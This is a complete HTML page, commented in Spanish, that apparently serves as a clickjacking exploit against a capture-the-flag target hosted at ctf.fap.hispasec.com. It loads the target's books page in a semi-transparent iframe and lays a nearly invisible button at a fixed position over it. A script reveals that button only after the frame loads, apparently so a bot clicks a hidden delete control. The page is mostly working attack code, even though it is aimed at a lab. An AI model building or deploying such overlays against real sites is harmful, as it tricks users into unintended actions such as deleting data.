<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Soporte Libros - GitHub Edition</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: white; }
        .wrapper { position: relative; width: 100%; height: 100%; }

        /* Ocultamos el botón al principio para que el bot no clique antes de tiempo */
        #objetivo {
            display: none; 
            position: absolute;
            z-index: 10;
            top: 900px; /* Tu coordenada fija */
            left: 50%;
            transform: translateX(-50%);
            width: 800px;
            height: 60px;
            opacity: 0.001; 
            background: red;
            border: none;
            cursor: pointer;
        }

        iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 1200px;
            border: none;
            z-index: 5;
            opacity: 0.5; /* Mantenlo así para ver si GitHub carga la web dentro */
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <button id="objetivo">BOTON DE ATAQUE</button>
        <iframe id="victima" src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

    <script>
        // Este script hace que el botón solo aparezca cuando el iframe ha cargado
        const frame = document.getElementById('victima');
        const btn = document.getElementById('objetivo');

        frame.onload = function() {
            console.log("Iframe cargado, activando objetivo...");
            // Esperamos 500ms extra por si acaso para que renderice el botón de borrar
            setTimeout(() => {
                btn.style.display = 'block';
            }, 500);
        };
    </script>
</body>
</html>
